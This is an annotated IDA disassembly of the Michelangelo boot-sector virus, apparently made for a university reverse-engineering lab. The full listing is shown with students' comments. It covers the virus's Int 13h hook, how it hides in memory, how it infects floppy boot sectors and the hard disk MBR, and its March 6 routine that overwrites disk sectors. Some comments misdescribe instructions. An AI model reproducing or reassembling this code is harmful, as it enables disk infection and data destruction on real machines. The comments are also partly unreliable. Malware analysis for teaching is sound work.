seg000:7C00 ;
seg000:7C00 ; +-------------------------------------------------------------------------+
seg000:7C00 ; |      This file was generated by The Interactive Disassembler (IDA)      |
seg000:7C00 ; |           Copyright (c) 2019 Hex-Rays, <support@hex-rays.com>           |
seg000:7C00 ; |                      License info: 48-BABB-7E64-E2                      |
seg000:7C00 ; |                     Georgia Institute of Technology                     |
seg000:7C00 ; +-------------------------------------------------------------------------+
seg000:7C00 ;
seg000:7C00 ; Input SHA256 : B8A70F4A55E3EF8F59363FDF1F6ECD8761F3B8CEF8DB122EB0B2081B8C4CCD0E
seg000:7C00 ; Input MD5    : 3FFC402675E30C6E42560EAA0A90A2B7
seg000:7C00 ; Input CRC32  : 827C7725
seg000:7C00
seg000:7C00 ; ---------------------------------------------------------------------------
seg000:7C00 ; File Name   : /nethome/dgabrielyan3/Lab1/michelangelo.1
seg000:7C00 ; Format      : Binary file
seg000:7C00 ; Base Address: 0000h Range: 7C00h - 7E00h Loaded length: 0200h
seg000:7C00
seg000:7C00                 .686p
seg000:7C00                 .mmx
seg000:7C00                 .model flat
seg000:7C00
seg000:7C00 ; ===========================================================================
seg000:7C00
seg000:7C00 ; Segment type: Pure code
seg000:7C00 seg000          segment byte public 'CODE' use16
seg000:7C00                 assume cs:seg000
seg000:7C00                 ;org 7C00h
seg000:7C00                 assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
seg000:7C00                 jmp     EnterVirus
seg000:7C00 ; ---------------------------------------------------------------------------
seg000:7C03 HighMemJump     db 0F5h                 ; DATA XREF: seg000:7CF0↓r
seg000:7C04                 db 0
seg000:7C05 MaxHead         dw 0                    ; DATA XREF: seg000:7CD8↓w
seg000:7C07                 db 2, 0Eh, 0
seg000:7C0A FirstSector     dw 9739h                ; DATA XREF: seg000:7CC1↓w
seg000:7C0C OldInt13h       dw 0F000h               ; DATA XREF: seg000:7CC7↓w
seg000:7C0E ; ---------------------------------------------------------------------------
seg000:7C0E                 push    ds              ; This is the new Int13h. Pushing data from registers DS and AX to the stack, so as to free them up for use by this function.
seg000:7C0F                 push    ax              ; Pushing data from registers DS and AX to the stack, so as to free them up for use by this function.
seg000:7C10                 or      dl, dl          ; Bitwise-ORs DL with itself to check if the drive is the default one or not.
seg000:7C12                 jnz     short ExitInt13h ; If (DL OR DL) not 0, i.e. if DL not equal to 00h (1st floppy disk), then exit.
seg000:7C14                 xor     ax, ax          ; Zero-out AX.
seg000:7C16                 mov     ds, ax          ; Copy AX (which is 0) to DS. => DS = 0
seg000:7C18                 test    byte ptr ds:43Fh, 1 ; TEST operation (i.e. AND but doesn't change the first operand) on the byte pointed at 43Fh offset of the data segment register. It sets the Zero Flag (ZF) when the result of the AND operation is 0. It can also modify the SF or PF flags. This is likely meant to check if the disk0 is spinning or not.
seg000:7C1D                 jnz     short ExitInt13h ; Jumps to ExitInt13h if the value at that offset is even (because ZF is set to 1 only when the result is 0 and that happens only with even numbers when AND-ing with 1). This will likely execute if disk0 isn't spinning.
seg000:7C1F                 pop     ax              ; Restoring AX from stack
seg000:7C20                 pop     ds              ; Restoring DS from stack.
seg000:7C21                 pushf                   ; Push flags register to the stack.
seg000:7C22                 call    dword ptr cs:0Ah ; Calls the function stored in a dword at 0Ah offset to the code segment. This is a call to the benign int13h.
seg000:7C27                 pushf                   ; Push flags register to the stack.
seg000:7C28                 call    InfectDisk      ; Calls the function to infect the disk.
seg000:7C2B                 popf                    ; Restore flags register from the stack.
seg000:7C2C                 retf    2               ; Transfer control back to the instruction address saved on the stack, releasing 2 bytes. Since it's RETF, i.e. RET Far, it would effectively pop the IP followed by the CS.
seg000:7C2F ; ---------------------------------------------------------------------------
seg000:7C2F
seg000:7C2F ExitInt13h:                             ; CODE XREF: seg000:7C12↑j
seg000:7C2F                                         ; seg000:7C1D↑j
seg000:7C2F                 pop     ax              ; Restore AX from stack.
seg000:7C30                 pop     ds              ; Restore DS from stack.
seg000:7C31                 jmp     dword ptr cs:0Ah ; Calls the function stored in a dword at 0Ah offset to the code segment. This is a call to the benign int13h.
seg000:7C36
seg000:7C36 ; =============== S U B R O U T I N E =======================================
seg000:7C36
seg000:7C36
seg000:7C36 InfectDisk      proc near               ; CODE XREF: seg000:7C28↑p
seg000:7C36                 push    ax              ; Push contents of AX to stack. All of these instructions are backing up the registers, so that they can be used for operations.
seg000:7C37                 push    bx              ; Push contents of BX to stack.
seg000:7C38                 push    cx              ; Push contents of CX to stack.
seg000:7C39                 push    dx              ; Push contents of DX to stack.
seg000:7C3A                 push    ds              ; Push contents of DS to stack.
seg000:7C3B                 push    es              ; Push contents of ES to stack.
seg000:7C3C                 push    si              ; Push contents of SI to stack.
seg000:7C3D                 push    di              ; Push contents of DI to stack.
seg000:7C3E                 push    cs              ; Push contents of CS to stack.
seg000:7C3F                 pop     ds              ; Pop top of stack into DS, i.e. contents of CS (since that was what was pushed to stack immediately before this). => DS = CS.
seg000:7C40                 push    cs              ; Push contents of CS to the stack.
seg000:7C41                 pop     es              ; Pop top of stack into ES, i.e. contents of CS (since that was what was pushed to stack immediately before this). => ES = CS, and CS == DS. => ES == CS == DS.
seg000:7C42                 mov     si, 4           ; Move 4 into the Source Index (SI) register. Therefore, it would try to read 3 times before quitting. There can be errors due to the time it takes for the disk motor to spin up to speed.
seg000:7C45
seg000:7C45 ReadBLBlock:                            ; CODE XREF: InfectDisk+29↓j
seg000:7C45                 mov     ax, 201h        ; Place the value 201h into AX. Read one sector - to check for infection.
seg000:7C48                 mov     bx, 200h        ; Place the value 200h into BX. Destination is 512 bytes beyond virus code.
seg000:7C4B                 mov     cx, 1           ; Place the value 1 into CX. => read track 0, sector 1 (MBR).
seg000:7C4E                 xor     dx, dx          ; Zero-out DX. Read first drive (00h).
seg000:7C50                 pushf                   ; Push flags register to stack.
seg000:7C51                 call    dword ptr ds:0Ah ; Calls the function stored at memory pointed to by a dword at 0Ah offset to DS. Since DS = CS, and CS:0Ah was the benign Int13h, this is a call to the benign Int13h.
seg000:7C55                 jnb     short CheckInfection ; Jump to CheckInfection if Carry Flag (CF) == 0. Int13h sets CF if there's an error. So CheckInfection would be invoked if Int13h returned error-free.
seg000:7C57                 xor     ax, ax          ; Zero-out AX.
seg000:7C59                 pushf                   ; Push flags register to stack.
seg000:7C5A                 call    dword ptr ds:0Ah ; Again, a call to the benign Int13h.
seg000:7C5E                 dec     si              ; Decrement Source Index (SI) register by 1. This helps implement the looping mechanism.
seg000:7C5F                 jnz     short ReadBLBlock ; Try reading the BootLoader block again, if Zero Flag (ZF) not set (i.e. SI > 0).
seg000:7C61                 jmp     short QuitInfect ; If fails 3 times, then ZF will be set to 0 by the DEC SI instruction. If ZF = 0, exit with QuitInfect.
seg000:7C63 ; ---------------------------------------------------------------------------
seg000:7C63
seg000:7C63 CheckInfection:                         ; CODE XREF: InfectDisk+1F↑j
seg000:7C63                 xor     si, si          ; Zero-out Source Index (SI) register.
seg000:7C65                 cld                     ; Clear Direction Flag (CDF) clears the DF flag in the EFLAGS register. => string operations increment the index registers ESI/EDI.
seg000:7C66                 lodsw                   ; Load the byte addressed by DS:[SI] into register AX. SI is then incremented (if DF = 0) or decremented (if DF = 1) by 1.
seg000:7C67                 cmp     ax, [bx]        ; Checks for infection by comparing the one sector we read into AX with the 512 bytes we read into BX.
seg000:7C69                 jnz     short InfectNow ; CMP sets ZF = 1 if the two operands are equal. => if the disk sector is not already infected (i.e. ax != [bx]), jump to InfectNow.
seg000:7C6B                 lodsw                   ; Load the byte addressed by DS:[SI] into register AX. SI is then incremented (if DF = 0) or decremented (if DF = 1) by 1.
seg000:7C6C                 cmp     ax, [bx+2]      ; Check once again.
seg000:7C6F                 jz      short QuitInfect ; If infected, jump to QuitInfect.
seg000:7C71
seg000:7C71 InfectNow:                              ; CODE XREF: InfectDisk+33↑j
seg000:7C71                 mov     ax, 301h        ; Writes the old BootLoader Block.
seg000:7C74                 mov     dh, 1           ; Disk head 1.
seg000:7C76                 mov     cl, 3           ; Disk Sector 3.
seg000:7C78                 cmp     byte ptr [bx+15h], 0FDh ; Check if it is a floppy disk (360k).
seg000:7C7C                 jz      short IsFloppy  ; Jump to IsFloppy if floppy disk confirmed (i.e. ZF set by CMP).
seg000:7C7E                 mov     cl, 0Eh         ; Move 0Eh into the Counter register (CL).
seg000:7C80
seg000:7C80 IsFloppy:                               ; CODE XREF: InfectDisk+46↑j
seg000:7C80                 mov     ds:8, cx        ; Move the contents of CX to DS:8. That is, first sector.
seg000:7C84                 pushf                   ; Push the flags register to stack.
seg000:7C85                 call    dword ptr ds:0Ah ; Call benign Int13h.
seg000:7C89                 jb      short QuitInfect ; Jump to QuitInfect if Carry Flag (CF) == 1. Int13h sets CF if there's an error. So QuitInfect would be invoked if Int13h returned with an error.
seg000:7C8B                 mov     si, 3BEh        ; Preparing data in registers for REP MOVSW.
seg000:7C8E                 mov     di, 1BEh        ; Preparing data in registers for REP MOVSW.
seg000:7C91                 mov     cx, 21h ; '!'   ; Setting CX to 21h. The number of iterations MOVSW needs to be executed. Copying the partition table.
seg000:7C94                 cld                     ; Clear Direction Flag (CDF) clears the DF flag in the EFLAGS register. => string operations increment the index registers ESI/EDI.
seg000:7C95                 rep movsw               ; Moves DS:SI to ES:DI, 21h times (since CX is 21h).
seg000:7C97                 mov     ax, 301h        ; Write the virus to sector 1 (pointed to by AX).
seg000:7C9A                 xor     bx, bx          ; Clear out BX.
seg000:7C9C                 mov     cx, 1           ; Set the Count Register (CX) to 1.
seg000:7C9F                 xor     dx, dx          ; Clear out DX.
seg000:7CA1                 pushf                   ; Push flags register to stack.
seg000:7CA2                 call    dword ptr ds:0Ah ; Call benign Int13h.
seg000:7CA6
seg000:7CA6 QuitInfect:                             ; CODE XREF: InfectDisk+2B↑j
seg000:7CA6                                         ; InfectDisk+39↑j ...
seg000:7CA6                 pop     di              ; Restore DI from stack.
seg000:7CA7                 pop     si              ; Restore SI from stack.
seg000:7CA8                 pop     es              ; Restore ES from stack.
seg000:7CA9                 pop     ds              ; Restore DS from stack.
seg000:7CAA                 pop     dx              ; Restore DX from stack.
seg000:7CAB                 pop     cx              ; Restore CX from stack.
seg000:7CAC                 pop     bx              ; Restore BX from stack.
seg000:7CAD                 pop     ax              ; Restore AX from stack.
seg000:7CAE                 retn                    ; Return Near restores the Instruction Pointer (IP).
seg000:7CAE InfectDisk      endp
seg000:7CAE
seg000:7CAF ; ---------------------------------------------------------------------------
seg000:7CAF
seg000:7CAF EnterVirus:                             ; CODE XREF: seg000:7C00↑j
seg000:7CAF                 xor     ax, ax          ; Clears ax
seg000:7CB1                 mov     ds, ax          ; Clears ds, loads 0 from ax
seg000:7CB3                 cli                     ; Turns off interrupts (SO that virus stack (sp) can be estabilished before anything else can overwrite it)
seg000:7CB4                 mov     ss, ax          ; Clears SS, loads 0 from ax
seg000:7CB6                 mov     ax, 7C00h       ; Moves 7C00h to AX.
seg000:7CB9                 mov     sp, ax          ; Sets the stack pointer to the address where the virus starts (7C00h).
seg000:7CBB                 sti                     ; Turns interrupts back on
seg000:7CBC                 push    ds              ; ds = 0 pushed on the stack
seg000:7CBD                 push    ax              ; ax = 7c00 pushed on the stack (later retf will return those 2 as a segment and offset 0:7C00).
seg000:7CBE                 mov     ax, ds:4Ch      ; Saves the address (the segment) of the int13 handeler into ax (located at memory 4C)
seg000:7CC1                 mov     ds:FirstSector, ax ; Segment address of the benign int13 is saved to 0x9739.
seg000:7CC4                 mov     ax, ds:4Eh      ; Saves the rest of the handeler address (the offset) to ax
seg000:7CC7                 mov     ds:OldInt13h, ax ; offset of the benign Int13 is saved into 0xF000
seg000:7CCA                 mov     ax, ds:413h     ; 413h is where BIOS stores the amount of memory blocks it has (in 1k). That number is moved to ax.
seg000:7CCD                 dec     ax              ; Available memory is shrunk by 1k bytes (639)
seg000:7CCE                 dec     ax              ; The memory is shrunk again by 1k bytes (638)
seg000:7CCF                 mov     ds:413h, ax     ; That info is stored back into the 413h location, Now BIOS will see 2k of less memory.
seg000:7CD2                 mov     cl, 6           ; cl = 6
seg000:7CD4                 shl     ax, cl          ; Performs a bit shift on ax which is at 638 (multiplies it by 2^6 = 64).
seg000:7CD6                 mov     es, ax          ; es = 638 * 64
seg000:7CD8                 mov     ds:MaxHead, ax  ; Sets the segment of the jump
seg000:7CDB                 mov     ax, 0Eh         ; prepares the new segment for the malicious int13
seg000:7CDE                 mov     ds:4Ch, ax      ; Writes the address of the knew handeler into the location of int13 handeler (4C). Now int13 has melicious segment
seg000:7CE1                 mov     word ptr ds:4Eh, es ; Puts the value in es (638 * 64) into the int13 handeler (idk why)
seg000:7CE5                 mov     cx, 1BEh        ; Specifys the size of the memory block to be copied by rep movsb (446 in decimal here into cx register).
seg000:7CE8                 mov     si, 7C00h       ; Puts si register as the beggining of virus code getting readdy to copy it
seg000:7CEB                 xor     di, di          ; Clears di to use it for copying destination.
seg000:7CED                 cld                     ; Clears the Direction flag to increament Di and Si towards higher memory (so copies downwards instead of upwards).
seg000:7CEE                 rep movsb               ; Starts copying the virus into es:00. es seems to be 638 * 64. It copies 446 block exactly (ommitting the singature and the partition table).
seg000:7CF0                 jmp     dword ptr cs:HighMemJump ; Jumps to the copied virus (694E:7C03).
seg000:7CF5 ; ---------------------------------------------------------------------------
seg000:7CF5                 xor     ax, ax          ; Clears ax
seg000:7CF7                 mov     es, ax          ; Clears ES. Moves 0 from AX -> ES.
seg000:7CF9                 int     13h             ; DISK - RESET DISK SYSTEM
seg000:7CF9                                         ; DL = drive (if bit 7 is set both hard disks and floppy disks reset)
seg000:7CFB                 push    cs              ; cs = 0 pushed on the stack
seg000:7CFC                 pop     ds              ; ds = 0 poped from the stack
seg000:7CFD                 mov     ax, 201h        ; AH = 2 so that it performs read from sector to memory. Al = 1 to read just the one sector.
seg000:7D00                 mov     bx, 7C00h       ; Chooses 0:7c00 as the address where to start filling the MBR from the disk. Essentially, it is replacing the virus code with legitamate MBR so that DOS can load.
seg000:7D03                 mov     cx, ds:8        ; Prepares to check if hard disk is infected
seg000:7D07                 cmp     cx, 7           ; Checks if hard disk is infected
seg000:7D0A                 jnz     short BootFloppy ; If not, boots from floppy
seg000:7D0C                 mov     dx, 80h         ; Else, specifys hard disk and boots from hard disk with the virus.
seg000:7D0F                 int     13h             ; DISK - READ SECTORS INTO MEMORY
seg000:7D0F                                         ; AL = number of sectors to read, CH = track, CL = sector
seg000:7D0F                                         ; DH = head, DL = drive, ES:BX -> buffer to fill
seg000:7D0F                                         ; Return: CF set on error, AH = status, AL = number of sectors read
seg000:7D11                 jmp     short VirusExit ; Since disk is infected only needs to check if it is the birthday and it is time to destroy files.
seg000:7D13 ; ---------------------------------------------------------------------------
seg000:7D13
seg000:7D13 BootFloppy:                             ; CODE XREF: seg000:7D0A↑j
seg000:7D13                 mov     cx, ds:8        ; Read the benign Boot Block.
seg000:7D17                 mov     dx, 100h        ; till 0:7C00h
seg000:7D1A                 int     13h             ; DISK - Call to Int13h
seg000:7D1C                 jb      short VirusExit ; Jump to VirusExit if Carry Flag (CF) == 1. Int13h sets CF if there's an error. So VirusExit would be invoked if Int13h returned with an error.
seg000:7D1E                 push    cs              ; Push CS to stack.
seg000:7D1F                 pop     es              ; Pop top of stack (i.e. CS) to ES. => ES = CS.
seg000:7D20                 mov     ax, 201h        ; AH = 2 so that it performs read from sector to memory. Al = 1 to read just the one sector.
seg000:7D23                 mov     bx, 200h        ; Write into blocks 512 after the virus code.
seg000:7D26                 mov     cx, 1           ; track = 0, sector = 1 (MBR)
seg000:7D29                 mov     dx, 80h         ; Setting DX to 80h for the following Int13h call (selecting the first hard disk).
seg000:7D2C                 int     13h             ; DISK - READ SECTORS INTO MEMORY
seg000:7D2C                                         ; AL = number of sectors to read, CH = track, CL = sector
seg000:7D2C                                         ; DH = head, DL = drive, ES:BX -> buffer to fill
seg000:7D2C                                         ; Return: CF set on error, AH = status, AL = number of sectors read
seg000:7D2E                 jb      short VirusExit ; Jump to VirusExit if Carry Flag (CF) == 1. Int13h sets CF if there's an error. So VirusExit would be invoked if Int13h returned with an error.
seg000:7D30                 xor     si, si          ; Clear up SI.
seg000:7D32                 cld                     ; Clear Direction Flag (CDF) clears the DF flag in the EFLAGS register. => string operations increment the index registers ESI/EDI.
seg000:7D33                 lodsw                   ; Load the byte addressed by DS:[SI] into register AX. SI is then incremented (if DF = 0) or decremented (if DF = 1) by 1.
seg000:7D34                 cmp     ax, [bx]        ; Check if HDD infected or not?
seg000:7D36                 jnz     short InfectHDD ; If not infected, then jump to InfectHDD.
seg000:7D38                 lodsw                   ; Check infection once again.
seg000:7D39                 cmp     ax, [bx+2]      ; Checking infection once again.
seg000:7D3C                 jnz     short InfectHDD ; Jump to InfectHDD if not infected.
seg000:7D3E
seg000:7D3E VirusExit:                              ; CODE XREF: seg000:7D11↑j
seg000:7D3E                                         ; seg000:7D1C↑j ...
seg000:7D3E                 xor     cx, cx          ; Clears cx
seg000:7D40                 mov     ah, 4           ; Sets up the paramater as per intA interrupt to get the date
seg000:7D42                 int     1Ah             ; CLOCK - READ DATE FROM REAL TIME CLOCK (AT,XT286,CONV,PS)
seg000:7D42                                         ; Return: DL = day in BCD
seg000:7D42                                         ; DH = month in BCD
seg000:7D42                                         ; CL = year in BCD
seg000:7D42                                         ; CH = century (19h or 20h)
seg000:7D44                 cmp     dx, 306h        ; Checks if it's March 6th
seg000:7D48                 jz      short Destroy   ; Destroys the files
seg000:7D4A                 retf                    ; If not March 6 just return (returns far meaning pops both CS and IP) 0:7C00
seg000:7D4B ; ---------------------------------------------------------------------------
seg000:7D4B
seg000:7D4B Destroy:                                ; CODE XREF: seg000:7D48↑j
seg000:7D4B                 xor     dx, dx          ; Clear out DX.
seg000:7D4D                 mov     cx, 1           ; Set CX to 1.
seg000:7D50
seg000:7D50 SmashSector:                            ; CODE XREF: seg000:7D7F↓j
seg000:7D50                                         ; seg000:7D85↓j
seg000:7D50                 mov     ax, 309h        ; Preparing data in registers for smashing disk. Ah = 3 so it will write to disk and AL = 9 so that many sectors will be overwritten.
seg000:7D53                 mov     si, ds:8        ; Move first sector address to SI.
seg000:7D57                 cmp     si, 3           ; If SI is 3, then jump to Smash.
seg000:7D5A                 jz      short Smash     ; Jump to Smash if SI is 3.
seg000:7D5C                 mov     al, 0Eh         ; Move 0Eh to AL.
seg000:7D5E                 cmp     si, 0Eh         ; If SI is 0Eh, then jump to Smash.
seg000:7D61                 jz      short Smash     ; Jump to Smash if SI is 0Eh.
seg000:7D63                 mov     dl, 80h         ; Moves 80h to DL for the first hard disk.
seg000:7D65                 mov     byte ptr ds:7, 4 ; Preparing data in registers for smashing disk (4 heads to overwrite).
seg000:7D6A                 mov     al, 11h         ; Preparing data in registers for smashing disk (17 sectors to overwrite).
seg000:7D6C
seg000:7D6C Smash:                                  ; CODE XREF: seg000:7D5A↑j
seg000:7D6C                                         ; seg000:7D61↑j
seg000:7D6C                 mov     bx, 5000h       ; Select a random memory space (this is the buffer it will be overwritten with).
seg000:7D6F                 mov     es, bx          ; Say 5000h:5000h.
seg000:7D71                 assume es:nothing
seg000:7D71                 int     13h             ; Perfrom OverWrite!
seg000:7D71                                         ; DISK - WRITE SECTORS FROM MEMORY
seg000:7D71                                         ; AL = number of sectors to write, CH = track, CL = sector
seg000:7D71                                         ; DH = head, DL = drive, ES:BX -> buffer
seg000:7D71                                         ; Return: CF set on error, AH = status, AL = number of sectors written
seg000:7D73                 jnb     short SkipIfError ; Skip if Int13h returns error.
seg000:7D75                 xor     ah, ah          ; Clear up AH.
seg000:7D77                 int     13h             ; DISK - RESET DISK SYSTEM
seg000:7D77                                         ; DL = drive (if bit 7 is set both hard disks and floppy disks reset)
seg000:7D79
seg000:7D79 SkipIfError:                            ; CODE XREF: seg000:7D73↑j
seg000:7D79                 inc     dh              ; Increment drive head.
seg000:7D7B                 cmp     dh, ds:7        ; Check head, 2 if floppy, 4 if HDD.
seg000:7D7F                 jb      short SmashSector ; Jump to SmashSector if Carry Flag (CF) == 1. CMP sets CF if there is unsigned overflow
seg000:7D81                 xor     dh, dh          ; Clear up DH.
seg000:7D83                 inc     ch              ; Increment Counter High.
seg000:7D85                 jmp     short SmashSector ; Jump to SmashSector.
seg000:7D87 ; ---------------------------------------------------------------------------
seg000:7D87
seg000:7D87 InfectHDD:                              ; CODE XREF: seg000:7D36↑j
seg000:7D87                                         ; seg000:7D3C↑j
seg000:7D87                 mov     cx, 7           ; Prepare to write partition table to sector 7, via Int13h.
seg000:7D8A                 mov     ds:8, cx        ; Prepare to write partition table to sector 7, via Int13h.
seg000:7D8E                 mov     ax, 301h        ; Prepare to write partition table to sector 7, via Int13h.
seg000:7D91                 mov     dx, 80h         ; Prepare to write partition table to sector 7, via Int13h.
seg000:7D94                 int     13h             ; DISK - WRITE SECTORS FROM MEMORY
seg000:7D94                                         ; AL = number of sectors to write, CH = track, CL = sector
seg000:7D94                                         ; DH = head, DL = drive, ES:BX -> buffer
seg000:7D94                                         ; Return: CF set on error, AH = status, AL = number of sectors written
seg000:7D96                 jb      short VirusExit ; Jumps to check for the birthday equality if int13 above errors (that is when CF is set and JB is performed if the CF=1).
seg000:7D98                 mov     si, 3BEh        ; Copy partition table information. (End of the benign MBR)
seg000:7D9B                 mov     di, 1BEh        ; Copy partition table information. (End of the copied virus code).
seg000:7D9E                 mov     cx, 21h ; '!'   ; Copy partition table information. (33 words, size of part table + signature)
seg000:7DA1                 rep movsw               ; Moves word at address DS:(E)SI to address ES:(E)DI, 21h times (since CX is 21h).
seg000:7DA3                 mov     ax, 301h        ; Prepare to write to sector 1.
seg000:7DA6                 xor     bx, bx          ; Prepare to copy virus to sector 1.
seg000:7DA8                 inc     cl              ; Increment the Counter Low register. (To specify sector 1 since cx was turned to 0 after the rep movsb)
seg000:7DAA                 int     13h             ; DISK - WRITE SECTORS FROM MEMORY
seg000:7DAA                                         ; AL = number of sectors to write, CH = track, CL = sector
seg000:7DAA                                         ; DH = head, DL = drive, ES:BX -> buffer
seg000:7DAA                                         ; Return: CF set on error, AH = status, AL = number of sectors written
seg000:7DAC                 jmp     short VirusExit ; Jump to VirusExit.
seg000:7DAC ; ---------------------------------------------------------------------------
seg000:7DAE                 db 50h dup(0), 55h, 0AAh ; PartitionInfo
seg000:7DAE seg000          ends
seg000:7DAE
seg000:7DAE
seg000:7DAE                 end
